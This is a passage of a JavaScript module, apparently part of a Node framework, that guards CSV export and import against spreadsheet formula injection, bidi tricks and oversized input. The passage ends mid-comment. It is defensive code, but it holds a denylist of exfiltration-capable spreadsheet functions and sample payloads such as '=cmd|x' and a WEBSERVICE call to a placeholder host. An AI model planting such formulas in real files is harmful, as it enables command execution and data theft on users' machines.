// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * @module b.guardCsv
 * @nav    Guards
 * @title  Guard Csv
 *
 * @intro
 *   CSV content-safety guard — defends against the broader threat
 *   catalog operators face when emitting or accepting CSVs sourced from
 *   user input. `b.csv.parse` / `b.csv.stringify` handle RFC 4180
 *   shape; this module layers the security catalog on top.
 *
 *   CSV-injection / formula-trigger defense: spreadsheet evaluators
 *   (Excel / LibreOffice / Google Sheets) treat any cell beginning with
 *   `=`, `+`, `-`, `@`, TAB, CR, LF, or `|` as a formula — including
 *   exfiltration vectors like `=WEBSERVICE(...)`, `=HYPERLINK(...)`,
 *   `=IMPORTXML(...)`. Full-width variants (U+FF1D `＝`, U+FF0B `＋`,
 *   U+FF0D `－`, U+FF20 `＠`) are caught alongside the ASCII triggers
 *   per the OWASP locale catalog. Five mitigation modes apply:
 *   `prefix-tab` (OWASP-recommended, prepends TAB so the evaluator
 *   treats the cell as text), `prefix-quote` (legacy `'` prefix),
 *   `wrap-with-quotes-and-prefix` (email-attachment posture),
 *   `reject` (throw), `allowlist` (only documented safe functions
 *   like SUM / AVERAGE pass through unprefixed).
 *
 *   Unicode bidi/zero-width strip: CVE-2021-42574 Trojan Source bidi
 *   overrides (U+202A-202E, U+2066-2069) are rejected or stripped
 *   per profile; zero-width characters (ZWSP / ZWNJ / ZWJ / WJ / SHY)
 *   always strip. Leading bidi/zero-width prefixes are stripped before
 *   the formula scan so a cell beginning with U+200B`=SUM(...)` cannot
 *   slip past the start-anchor check.
 *
 *   CSV-bomb caps: per-cell (`maxCellBytes`, default 64 KiB), total
 *   (`maxTotalBytes`, default 1 GiB), row count (`maxRows`, default
 *   ~1 M), column count (`maxColumns`, default 1024), and a sanitize
 *   amplification ratio (`sanitizeAmplificationCap`, default 1.5x)
 *   that refuses pathological re-quote expansions.
 *
 *   Doubled-quote escape is delegated to `b.csv.stringify` — every
 *   cell value containing the delimiter, the quote char, CR, or LF
 *   is wrapped in quotes with embedded quotes doubled per RFC 4180.
 *
 *   Profiles: `strict` / `balanced` / `permissive` /
 *   `email-attachment`. Compliance postures: `hipaa` / `pci-dss` /
 *   `gdpr` / `soc2`. Operators select via `{ profile: "strict" }` or
 *   `{ compliancePosture: "hipaa" }`; postures overlay on top of the
 *   profile baseline.
 *
 *   Threat-detection regex literals are composed programmatically
 *   from numeric codepoint ranges so the source file stays pure
 *   ASCII — never embeds the attack characters themselves.
 *
 * @card
 *   CSV content-safety guard — defends against the broader threat catalog operators face when emitting or accepting CSVs sourced from user input.
 */

var codepointClass = require("./codepoint-class");
var csv = require("./csv");
var safeBuffer = require("./safe-buffer");
var C = require("./constants");
var lazyRequire = require("./lazy-require");
var numericBounds = require("./numeric-bounds");
var gateContract = require("./gate-contract");
var validateOpts = require("./validate-opts");
var { GuardCsvError } = require("./framework-error");

var observability = lazyRequire(function () { return require("./observability"); });
void observability;

var _err = GuardCsvError.factory;

// Shared codepoint catalog (BIDI / C0_CTRL / ZERO_WIDTH ranges and
// pre-compiled regexes) lives in lib/codepoint-class.js.

// CSV-specific homoglyph catalog — visual-confusable letter ranges that
// homoglyph against ASCII:
//   Cyrillic   U+0400-U+04FF
//   Greek      U+0370-U+03FF
//   Fullwidth  U+FF21-U+FF5A
var HOMOGLYPH_RANGES = [[0x0400, 0x04FF], [0x0370, 0x03FF], [0xFF21, 0xFF5A]];

// Formula-prefix triggers — every char that signals "this cell is a
// formula" to a spreadsheet evaluator:
//   ASCII       =  +  -  @  TAB  CR  LF  |
//   Full-width  ＝ U+FF1D  ＋ U+FF0B  － U+FF0D  ＠ U+FF20
var FORMULA_PREFIX_CPS = [0x3D, 0x2B, 0x2D, 0x40, 0x09, 0x0D, 0x0A, 0x7C,
                          0xFF1D, 0xFF0B, 0xFF0D, 0xFF20];

// Spreadsheet functions on the dangerous-function denylist (per OWASP /
// bishopfox / Veracode catalogs). Surfaced as critical regardless of the
// broader formulaInjectionPolicy.
var DANGEROUS_FUNCTIONS = Object.freeze([
  "WEBSERVICE", "HYPERLINK", "IMAGE", "DDE", "RTD", "CALL",
  "IMPORTXML", "IMPORTRANGE", "IMPORTHTML", "IMPORTFEED", "IMPORTDATA",
  "GOOGLEFINANCE", "GOOGLETRANSLATE",
]);

// ---- Codepoint helpers (proxied to lib/codepoint-class) ----

var HEX_RADIX = 16;                                                 // base-16 radix, not byte size
var _hex4      = codepointClass.hex4;
var _charClass = codepointClass.charClass;
var _fromCp    = codepointClass.fromCp;
function _stringFromCps(cps) {
  return cps.map(_fromCp).join("");
}

// ---- Compiled detectors ----
// Shared regexes pulled from lib/codepoint-class; CSV-specific ones
// (homoglyph + leading-BOM) compiled here.

var BIDI_RE       = codepointClass.BIDI_RE;
var BIDI_RE_G     = codepointClass.BIDI_RE_G;
var C0_CTRL_RE    = codepointClass.C0_CTRL_RE;
var C0_CTRL_RE_G  = codepointClass.C0_CTRL_RE_G;
var ZW_RE_G       = codepointClass.ZW_RE_G;
var NULL_RE_G     = codepointClass.NULL_RE_G;
var HOMOGLYPH_RE  = new RegExp("[" + _charClass(HOMOGLYPH_RANGES) + "]");      // allow:dynamic-regex — codepoints from HOMOGLYPH_RANGES literal table
var HOMOGLYPH_G   = new RegExp("[" + _charClass(HOMOGLYPH_RANGES) + "]", "g"); // allow:dynamic-regex — codepoints from HOMOGLYPH_RANGES literal table
var BOM_RE_LEAD   = new RegExp("^" + _hex4(0xFEFF));                           // allow:dynamic-regex — single literal codepoint U+FEFF
var BOM_RE_G      = new RegExp(_hex4(0xFEFF), "g");                            // allow:dynamic-regex — single literal codepoint U+FEFF

// Formula-trigger character class assembled from FORMULA_PREFIX_CPS:
//   [=+\-@\t\r\u3D...] — used inside the "<line-start or delimiter>"
//   formula-prefix scan and the dangerous-function scan.
var FORMULA_TRIGGER_CLASS = (function () {
  var parts = FORMULA_PREFIX_CPS.map(function (cp) {
    if (cp === 0x2D) return "\\-";    // hyphen literal inside char class
    if (cp === 0x5C) return "\\\\";   // backslash safety
    return _hex4(cp);
  });
  return "[" + parts.join("") + "]";
})();

// allow:dynamic-regex — class composed from FORMULA_PREFIX_CPS literal table
var FORMULA_SCAN_RE = new RegExp(
  "(^|[,;\\t|])\"?(" + FORMULA_TRIGGER_CLASS + ")"
);
// allow:dynamic-regex — class composed from FORMULA_PREFIX_CPS literal table
var DANGER_SCAN_RE = new RegExp(
  "(^|[,;\\t|])\"?" + FORMULA_TRIGGER_CLASS + "([A-Z][A-Z0-9_.]*)\\b",
  "g"
);
// allow:dynamic-regex — class composed from FORMULA_PREFIX_CPS literal table
var ALLOWLIST_FIRST_WORD_RE = new RegExp(
  "^" + FORMULA_TRIGGER_CLASS + "([A-Z]+)\\b"
);

var NULL_BYTE = codepointClass.NULL_BYTE;
var BOM_CHAR  = codepointClass.BOM_CHAR;

// FORMULA_PREFIXES — array of single-char strings; iteration cost is
// the same as a Set for n=12. _stringFromCps keeps the source ASCII.
var FORMULA_PREFIXES = Object.freeze(_stringFromCps(FORMULA_PREFIX_CPS).split(""));

// Default row count cap for serialize. 2^20 ~ 1M rows.
var DEFAULT_MAX_ROWS = 0x100000;

// ---- Profile presets ----

var PROFILES = Object.freeze({
  "strict": {
    formulaInjectionPolicy:   "prefix-tab",       // OWASP-recommended Excel-resistant mitigation
    bidiCharPolicy:           "reject",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "reject",
    nullByteHandling:         "reject",
    trailingWhitespacePolicy: "trim",
    bomPrefix:                false,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
  "balanced": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "strip",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "preserve",
    bomPrefix:                false,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
  "permissive": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "audit",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "preserve",
    bomPrefix:                false,
    dialectPolicy:            "permissive",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "scientific",
    dateFormat:               "iso8601",
  },
  "email-attachment": {
    formulaInjectionPolicy:   "wrap-with-quotes-and-prefix",
    bidiCharPolicy:           "strip",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "trim",
    bomPrefix:                true,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
});

var DEFAULTS = gateContract.strictDefaults(PROFILES, {
  delimiter:                 ",",
  lineEnding:                "\r\n",
  encoding:                  "utf-8",
  locale:                    "C",
  formulasAllowlist:         Object.freeze(["SUM", "AVERAGE", "COUNT", "MIN", "MAX", "IF", "CONCATENATE"]),
  dangerousFunctions:        DANGEROUS_FUNCTIONS,
  maxRows:                   DEFAULT_MAX_ROWS,
  maxCellBytes:              C.BYTES.kib(64),
  maxTotalBytes:             C.BYTES.gib(1),
  maxColumns:                0x400,
  sanitizeAmplificationCap:  1.5,
  nullMarker:                "\\N",
  preserveLeadingZeros:      false,
  preserveBooleanStrings:    false,
  preserveDateStrings:       false,
  piiPolicy:                 "preserve",
  forensicSnippetBytes:      0,
  maxRuntimeMs:              C.TIME.seconds(30),
});

var COMPLIANCE_POSTURES = gateContract.compliancePostures(PROFILES, { base: 256, overlays: { hipaa: { piiPolicy: "redact" }, "pci-dss": { piiPolicy: "redact" }, gdpr: { piiPolicy: "redact" } } });

// ---- Internal helpers ----

function _firstMatch(text, re) {
  if (typeof text !== "string") return null;
  var m = text.match(re);
  if (!m) return null;
  return { index: m.index, char: m[0] };
}

function _detectIssues(text, opts) {
  var issues = [];
  if (typeof text !== "string") return issues;

  var bomIdx = text.indexOf(BOM_CHAR);
  if (bomIdx > 0 || (bomIdx === 0 && !opts.bomPrefix)) {
    issues.push({
      kind: "bom-mid-stream", severity: "high", ruleId: "csv.bom",
      location: bomIdx, snippet: "BOM at byte " + bomIdx,
    });
  }

  // Bidi / null / control / zero-width via the shared codepoint class. CSV
  // exposes its own policy vocabulary (bidiCharPolicy / controlCharPolicy /
  // nullByteHandling), normalized here to the shared detector's names so the
  // per-class match-and-push blocks live in exactly one place; zero-width is
  // always scanned (warn) since CSV ships no zeroWidthPolicy.
  issues.push.apply(issues, codepointClass.detectCharThreats(text, {
    bidiPolicy:      opts.bidiCharPolicy,
    controlPolicy:   opts.controlCharPolicy,
    nullBytePolicy:  opts.nullByteHandling,
    zeroWidthPolicy: opts.zeroWidthPolicy || "audit",
  }, "csv", "warn"));

  if (opts.homoglyphPolicy !== "allow" && /[A-Za-z]/.test(text)) {
    var homoMatch = _firstMatch(text, HOMOGLYPH_RE);
    if (homoMatch) {
      issues.push({
        kind: "homoglyph", severity: "warn", ruleId: "csv.homoglyph",
        location: homoMatch.index,
        snippet: "homoglyph U+" + homoMatch.char.charCodeAt(0).toString(HEX_RADIX) +
                 " mixed with ASCII at byte " + homoMatch.index,
      });
    }
  }


  if (opts.formulaInjectionPolicy !== "audit-only" && opts.formulaInjectionPolicy !== "allow") {
    // Strip ZWSP / RTLO / LRM / RLM / BOM at cell-start before the
    // formula scan. Without this, a cell beginning with U+200B (zero-
    // width space), U+202E (RTLO), U+200E/F (LTR/RTL marks), or U+FEFF
    // (BOM) followed by `=` slips past the start-anchor check (the `^`
    // sits before the codepoint, not after) and the formula reaches
    // the spreadsheet evaluator. Browsers + Excel + Sheets all strip
    // these silently — operator users see "=SUM(...)" rendered, the
    // file shipped a hidden bidi prefix that bypassed the scanner.
    // U+200B-200F (ZWSP / ZWNJ / ZWJ / LRM / RLM) +
    // U+202A-202E (LRE / RLE / PDF / LRO / RLO) +
    // U+2066-2069 (LRI / RLI / FSI / PDI) +
    // U+FEFF (BOM)                                                     // allow:dynamic-regex — explicit codepoints, no operator input
    var stripped = text.replace(new RegExp("^[\\u200B-\\u200F\\u202A-\\u202E\\u2066-\\u2069\\uFEFF]+"), "");
    var formulaMatch = _firstMatch(stripped, FORMULA_SCAN_RE);
    if (formulaMatch) {
      issues.push({
        kind: "formula-prefix-cell", severity: "critical",
        ruleId: "csv.formula-injection",
        location: formulaMatch.index,
        snippet: "cell beginning with formula trigger " +
                 JSON.stringify(formulaMatch.char.slice(-1)) +
                 " at byte " + formulaMatch.index +
                 (stripped.length !== text.length ? " (after stripping leading bidi/zero-width prefix)" : ""),
      });
    }
  }

  if (Array.isArray(opts.dangerousFunctions) && opts.dangerousFunctions.length > 0) {
    var dangerIter = text.matchAll(DANGER_SCAN_RE);
    var dangerMatch;
    for (dangerMatch of dangerIter) {
      var fn = dangerMatch[2].toUpperCase();
      if (opts.dangerousFunctions.indexOf(fn) !== -1) {
        issues.push({
          kind: "dangerous-function", severity: "critical",
          ruleId: "csv.dangerous-function",
          location: dangerMatch.index,
          snippet: "spreadsheet function " + JSON.stringify(fn) +
                   " is on the dangerous-function denylist (exfiltration / RCE vector)",
        });
      }
    }
  }

  if (opts.dialectPolicy === "strict") {
    var hasCrlf = text.indexOf("\r\n") !== -1;
    var hasLfOnly = /[^\r]\n/.test(text);
    var hasCrOnly = /\r[^\n]/.test(text);
    if ((hasCrlf && hasLfOnly) || (hasCrlf && hasCrOnly) || (hasLfOnly && hasCrOnly)) {
      issues.push({
        kind: "dialect-mixed-line-endings", severity: "high",
        ruleId: "csv.dialect", snippet: "mixed line endings",
      });
    }
  }

  return issues;
}

function _stripIssues(text, opts) {
  if (typeof text !== "string") return text;
  var out = text;
  if (opts.bomPrefix !== true) out = out.replace(BOM_RE_LEAD, "");
  out = out.replace(BOM_RE_G, "");
  if (opts.bidiCharPolicy === "strip") out = out.replace(BIDI_RE_G, "");
  if (opts.controlCharPolicy === "strip") out = out.replace(C0_CTRL_RE_G, "");
  if (opts.nullByteHandling === "strip") out = out.replace(NULL_RE_G, "");
  if (opts.homoglyphPolicy === "strip") out = out.replace(HOMOGLYPH_G, "");
  out = out.replace(ZW_RE_G, "");
  if (opts.trailingWhitespacePolicy === "trim") {
    out = out.split("\n").map(function (line) {
      // Linear per-line trailing-whitespace trim — .replace(/[ \t]+$/) is
      // O(n^2) in V8 on adversarial input (untrusted CSV here).
      return safeBuffer.stripTrailingHspace(line);
    }).join("\n");
  }
  return out;
}

// _resolveOpts removed — the generated guard exposes the bound resolver as
// module.exports.resolveOpts (defineGuard owns the profile/posture binding).

// ---- Cell-level escape with full threat application ----

/**
 * @primitive  b.guardCsv.escapeCell
 * @signature  b.guardCsv.escapeCell(value, opts?)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.serialize, b.guardCsv.gate, b.csv.stringify
 *
 * Apply the full guard-csv threat catalog to a single cell value:
 * formula-prefix mitigation, null-byte / C0-control / bidi handling,
 * trailing-whitespace policy, numeric-precision policy, and BigInt
 * disposition. Returns the safe string form. Throws `GuardCsvError`
 * when a `reject` policy fires (formula-trigger under
 * `formulaInjectionPolicy: "reject"`, control char under
 * `controlCharPolicy: "reject"`, etc.) or when the cell exceeds
 * `maxCellBytes`.
 *
 * Used internally by `b.guardCsv.serialize` per cell; exposed
 * directly for operators that emit CSV through their own writer
 * (streaming exports, third-party libraries) and only need the
 * per-cell defense.
 *
 * @opts
 *   formulaInjectionPolicy: "prefix-tab"|"prefix-quote"|"wrap-with-quotes-and-prefix"|"reject"|"allowlist",
 *   formulasAllowlist:      string[],   // when policy === "allowlist"
 *   bidiCharPolicy:         "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy:      "reject"|"strip"|"allow",
 *   nullByteHandling:       "reject"|"strip"|"allow",
 *   trailingWhitespacePolicy: "trim"|"preserve"|"reject",
 *   numericPrecisionPolicy: "decimal-string-above-safe-int"|"scientific"|"reject-bigint",
 *   maxCellBytes:           number,     // default 65536 (64 KiB)
 *
 * @example
 *   var safe = b.guardCsv.escapeCell("=cmd|x", { formulaInjectionPolicy: "prefix-tab" });
 *   safe;                                              // → "\t=cmd|x"
 *
 *   // Reject mode throws GuardCsvError instead of disarming.
 *   try {
 *     b.guardCsv.escapeCell("+1234567", { formulaInjectionPolicy: "reject" });
 *   } catch (e) {
 *     e.code;                                          // → "csv.formula-injection"
 *   }
 *
 *   // Numeric precision: above MAX_SAFE_INTEGER, write as decimal string.
 *   var huge = b.guardCsv.escapeCell(9007199254740993, {
 *     numericPrecisionPolicy: "decimal-string-above-safe-int",
 *   });
 *   huge;                                              // → "9007199254740993"
 */
function escapeCell(value, opts) {
  opts = Object.assign({}, DEFAULTS, opts || {});
  var str = value == null ? "" : String(value);

  var cellBytes = Buffer.byteLength(str, "utf8");
  if (cellBytes > opts.maxCellBytes) {
    throw _err("csv.cell-too-large",
      "cell is " + cellBytes + " bytes, exceeds maxCellBytes " + opts.maxCellBytes);
  }

  if (opts.nullByteHandling === "reject" && str.indexOf(NULL_BYTE) !== -1) {
    throw _err("csv.null-byte", "cell contains null byte");
  }
  if (opts.controlCharPolicy === "reject" && C0_CTRL_RE.test(str)) {       // allow:regex-no-length-cap — str length capped by maxCellBytes above
    throw _err("csv.control", "cell contains C0 control character");
  }
  if (opts.bidiCharPolicy === "reject" && BIDI_RE.test(str)) {             // allow:regex-no-length-cap — str length capped by maxCellBytes above
    throw _err("csv.bidi", "cell contains Unicode bidi override (CVE-2021-42574)");
  }

  if (opts.nullByteHandling === "strip") str = str.replace(NULL_RE_G, "");
  if (opts.controlCharPolicy === "strip") str = str.replace(C0_CTRL_RE_G, "");
  if (opts.bidiCharPolicy === "strip") str = str.replace(BIDI_RE_G, "");

  if (opts.trailingWhitespacePolicy === "trim") {
    // Linear strip — .replace(/[ \t]+$/) is O(n^2) on adversarial untrusted CSV.
    str = safeBuffer.stripTrailingHspace(str);
  } else if (opts.trailingWhitespacePolicy === "reject") {
    // Linear "ends in space/tab?" check — /[ \t]+$/.test is ALSO O(n^2) (the
    // engine scans from every offset when there is no trailing run).
    var lastCode = str.length > 0 ? str.charCodeAt(str.length - 1) : 0;
    if (lastCode === 0x20 || lastCode === 0x09) {
      throw _err("csv.trailing-whitespace", "cell has trailing whitespace");
    }
  }

  if (typeof value === "number" &&
      opts.numericPrecisionPolicy === "decimal-string-above-safe-int") {
    if (Math.abs(value) > Number.MAX_SAFE_INTEGER) {
      str = value.toLocaleString("en-US", {
        useGrouping: false, maximumFractionDigits: 0,
      });
    }
  }
  if (typeof value === "bigint") {
    if (opts.numericPrecisionPolicy === "reject-bigint") {
      throw _err("csv.bigint", "BigInt values rejected per numericPrecisionPolicy");
    }
    str = value.toString();
  }

  if (str.length > 0 && FORMULA_PREFIXES.indexOf(str.charAt(0)) !== -1) {
    var policy = opts.formulaInjectionPolicy;
    if (policy === "reject") {
      throw _err("csv.formula-injection",
        "cell starts with formula prefix " + JSON.stringify(str.charAt(0)));
    } else if (policy === "prefix-tab") {
      str = "\t" + str;
    } else if (policy === "prefix-quote") {
      str = "'" + str;
    } else if (policy === "wrap-with-quotes-and-prefix") {
      str = "'" + str;
    } else if (policy === "allowlist") {
      var firstWord = str.match(ALLOWLIST_FIRST_WORD_RE);
      if (firstWord && opts.formulasAllowlist.indexOf(firstWord[1]) === -1) {
        str = "'" + str;
      }
    }
  }

  return str;
}

// ---- Schema-bound serializer ----

/**
 * @primitive  b.guardCsv.schema
 * @signature  b.guardCsv.schema(spec)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.serialize, b.guardCsv.validate
 *
 * Build a schema-bound serializer/validator pair. Each row's column
 * values are checked against the column's `type` (`"string"` /
 * `"number"` / `"boolean"`), optional `regex`, optional `min` / `max`
 * (for numbers), and `nullable` flag before the row reaches
 * `serialize`. Type / range / regex / null violations throw
 * `GuardCsvError` with codes `csv.schema-type` / `csv.schema-range`
 * / `csv.schema-regex` / `csv.schema-null` and the offending row
 * index — operators get the failing-row coordinates without parsing
 * the error string.
 *
 * Returns `{ serialize, validate, columns }`. The returned
 * `serialize` accepts the same opts as `b.guardCsv.serialize` and
 * applies the column ordering automatically.
 *
 * @example
 *   var bound = b.guardCsv.schema({
 *     columns: [
 *       { name: "email", type: "string", regex: /^[^@]+@[^@]+$/ },
 *       { name: "age",   type: "number", min: 0, max: 150, nullable: true },
 *     ],
 *   });
 *
 *   var out = bound.serialize([
 *     { email: "alice@example.com", age: 30 },
 *     { email: "bob@example.com",   age: null },
 *   ], { profile: "strict" });
 *   out.indexOf("alice@example.com") !== -1;           // → true
 */
function schema(spec) {
  validateOpts.requireObject(spec, "guardCsv.schema", GuardCsvError);
  if (!Array.isArray(spec.columns)) {
    throw _err("csv.bad-schema", "schema.columns must be an array");
  }
  var cols = spec.columns.slice();

  return {
    serialize: function (rows, opts) {
      opts = opts || {};
      var validated = [];
      for (var ri = 0; ri < rows.length; ri += 1) {
        var row = rows[ri];
        var validatedRow = {};
        for (var ci = 0; ci < cols.length; ci += 1) {
          var col = cols[ci];
          var v = row[col.name];
          if (v == null) {
            if (col.nullable === false) {
              throw _err("csv.schema-null",
                "column " + JSON.stringify(col.name) +
                " is non-nullable; row " + ri + " has null");
            }
            validatedRow[col.name] = v;
            continue;
          }
          if (col.type === "string" && typeof v !== "string") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects string at row " + ri);
          }
          if (col.type === "number" && typeof v !== "number") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects number at row " + ri);
          }
          if (col.type === "boolean" && typeof v !== "boolean") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects boolean at row " + ri);
          }
          if (col.regex && !col.regex.test(String(v))) {
            throw _err("csv.schema-regex",
              "column " + JSON.stringify(col.name) +
              " value " + JSON.stringify(v) +
              " at row " + ri + " does not match regex " + col.regex);
          }
          if (col.type === "number" && typeof col.min === "number" && v < col.min) {
            throw _err("csv.schema-range",
              "column " + JSON.stringify(col.name) + " < min at row " + ri);
          }
          if (col.type === "number" && typeof col.max === "number" && v > col.max) {
            throw _err("csv.schema-range",
              "column " + JSON.stringify(col.name) + " > max at row " + ri);
          }
          validatedRow[col.name] = v;
        }
        validated.push(validatedRow);
      }
      return serialize(validated, Object.assign({
        headers: cols.map(function (c) { return c.name; }),
      }, opts));
    },
    validate: function (input, opts) {
      return module.exports.validate(input, Object.assign({ schema: spec }, opts || {}));
    },
    columns: cols,
  };
}

// ---- Module-level entry points ----

/**
 * @primitive  b.guardCsv.serialize
 * @signature  b.guardCsv.serialize(rows, opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.escapeCell, b.guardCsv.gate, b.csv.stringify
 *
 * Emit RFC 4180 CSV from `rows` (array of objects or array of
 * arrays) with the full guard-csv threat catalog applied per cell
 * — formula-prefix mitigation, bidi/null/control handling,
 * trailing-whitespace policy, numeric-precision policy. Doubled-
 * quote escape is delegated to `b.csv.stringify`. Caps enforced:
 * `maxRows`, `maxCellBytes`, `maxColumns`, `maxTotalBytes` (each
 * a positive finite integer; passing `Infinity` throws).
 *
 * When `piiPolicy: "redact"` is set and an `opts.redact` instance
 * is passed (typically `b.redact.create(...)`), every emitted
 * string cell is run through `redact.string(...)` before
 * stringification. The HIPAA / PCI-DSS / GDPR postures default
 * `piiPolicy` to `"redact"`.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   headers:    string[]|false,    // explicit column order; false suppresses header row
 *   delimiter:  string,            // default ","
 *   lineEnding: string,            // default "\r\n"
 *   bomPrefix:  boolean,           // prepend U+FEFF (Excel-friendly)
 *   maxRows:    number,            // default 1048576
 *   maxCellBytes:  number,         // default 65536
 *   maxColumns: number,            // default 1024
 *   maxTotalBytes: number,         // default 1073741824 (1 GiB)
 *   piiPolicy:  "preserve"|"redact",
 *   redact:     b.redact instance, // required when piiPolicy === "redact"
 *
 * @example
 *   var out = b.guardCsv.serialize([
 *     { name: "alice", note: "=WEBSERVICE(\"http://x\")" },
 *     { name: "bob",   note: "ok" },
 *   ], { profile: "strict" });
 *
 *   // Formula trigger disarmed with a leading TAB per OWASP guidance:
 *   out.indexOf("\t=WEBSERVICE") !== -1;               // → true
 *   out.indexOf("\r\n") !== -1;                        // → true
 */
function serialize(rows, opts) {
  opts = module.exports.resolveOpts(opts);
  numericBounds.requireAllPositiveFiniteIntIfPresent(opts,
    ["maxRows", "maxCellBytes", "maxTotalBytes"],
    "guardCsv.serialize", GuardCsvError, "csv.bad-opt");

  if (!Array.isArray(rows)) {
    throw _err("csv.bad-input",
      "serialize: rows must be an array, got " + typeof rows);
  }
  if (rows.length > opts.maxRows) {
    throw _err("csv.too-many-rows",
      "row count " + rows.length + " exceeds maxRows " + opts.maxRows);
  }

  var redactor = (opts.piiPolicy === "redact" && opts.redact) ? opts.redact : null;

  var escapedRows = [];
  for (var ri = 0; ri < rows.length; ri += 1) {
    var row = rows[ri];
    var escapedRow;
    if (Array.isArray(row)) {
      escapedRow = row.map(function (v) {
        var ev = escapeCell(v, opts);
        if (Buffer.byteLength(ev, "utf8") > opts.maxCellBytes) {
          throw _err("csv.cell-too-large",
            "cell at row " + ri + " exceeds maxCellBytes " + opts.maxCellBytes);
        }
        if (redactor && typeof ev === "string") ev = redactor.string(ev);
        return ev;
      });
    } else if (row !== null && typeof row === "object") {
      escapedRow = {};
      var keys = Object.keys(row);
      if (keys.length > opts.maxColumns) {
        throw _err("csv.too-many-columns",
          "row " + ri + " has " + keys.length + " columns; max " + opts.maxColumns);
      }
      for (var ki = 0; ki < keys.length; ki += 1) {
        var ev2 = escapeCell(row[keys[ki]], opts);
        if (Buffer.byteLength(ev2, "utf8") > opts.maxCellBytes) {
          throw _err("csv.cell-too-large",
            "cell at row " + ri + " column " + JSON.stringify(keys[ki]) +
            " exceeds maxCellBytes");
        }
        if (redactor && typeof ev2 === "string") ev2 = redactor.string(ev2);
        escapedRow[keys[ki]] = ev2;
      }
    } else {
      throw _err("csv.bad-input", "rows must be arrays or plain objects");
    }
    escapedRows.push(escapedRow);
  }

  var out = csv.stringify(escapedRows, {
    delimiter:    opts.delimiter,
    quote:        opts.quote || "\"",
    eol:          opts.lineEnding,
    alwaysQuote:  opts.alwaysQuote || false,
    columns:      opts.headers || null,
    header:       opts.headers !== false,
  });

  var totalBytes = Buffer.byteLength(out, "utf8");
  if (opts.bomPrefix) {
    out = BOM_CHAR + out;
    totalBytes += 3;
  }
  if (totalBytes > opts.maxTotalBytes) {
    throw _err("csv.total-too-large",
      "output size " + totalBytes + " bytes exceeds maxTotalBytes " + opts.maxTotalBytes);
  }
  return out;
}

/**
 * @primitive  b.guardCsv.validate
 * @signature  b.guardCsv.validate(input, opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.sanitize, b.guardCsv.gate
 *
 * Inspect `input` (string or Buffer of CSV text) and return
 * `{ ok, issues }`. Each issue carries `{ kind, severity,
 * ruleId, location, snippet }` with severity in
 * `"warn"|"high"|"critical"`. Detected: BOM mid-stream, Unicode
 * bidi override (CVE-2021-42574), C0 control char, null byte,
 * homoglyph, zero-width char, formula-prefix cell (bidi/zero-width
 * leading prefix is stripped before the scan), dangerous-function
 * denylist hit, mixed line endings (when `dialectPolicy: "strict"`).
 * Pure inspection — never mutates input or throws.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   bidiCharPolicy:        "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy:     "reject"|"strip"|"allow",
 *   nullByteHandling:      "reject"|"strip"|"allow",
 *   homoglyphPolicy:       "audit"|"strip"|"allow",
 *   formulaInjectionPolicy: "prefix-tab"|"prefix-quote"|"wrap-with-quotes-and-prefix"|"reject"|"audit-only"|"allow",
 *   dangerousFunctions:    string[],
 *   dialectPolicy:         "strict"|"permissive",
 *
 * @example
 *   var rv = b.guardCsv.validate("name,formula\r\nalice,=WEBSERVICE(\"x\")\r\n", {
 *     profile: "strict",
 *   });
 *   rv.ok;                                             // → false
 *   rv.issues.some(function (i) { return i.kind === "dangerous-function"; });  // → true
 */
// validate is generated by defineGuard from `detect` (_detectIssues) under the
// "text" input contract — runIssueValidator(input, resolved, _detectIssues,
// "text") — identical to the hand-written wrapper this replaced.

/**
 * @primitive  b.guardCsv.sanitize
 * @signature  b.guardCsv.sanitize(input, opts?)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.validate, b.guardCsv.gate
 *
 * Best-effort cleanup of `input` (string or Buffer): strips leading
 * BOM (when `bomPrefix: false`), bidi override chars (when
 * `bidiCharPolicy: "strip"`), C0 control chars (when
 * `controlCharPolicy: "strip"`), null bytes (when
 * `nullByteHandling: "strip"`), zero-width chars (always), and
 * trailing whitespace per `trailingWhitespacePolicy`. Refuses
 * pathological expansion: when the sanitized output exceeds
 * `sanitizeAmplificationCap` (default 1.5x) the function throws
 * `GuardCsvError("csv.sanitize-amplified")` — sanitize is a
 * shrinking operation by contract, never a growing one.
 *
 * Note: sanitize does NOT prepend formula-trigger mitigations to
 * cells (that's `b.guardCsv.serialize` / `b.guardCsv.escapeCell`'s
 * job, applied during emission). Use the `gate` action chain for
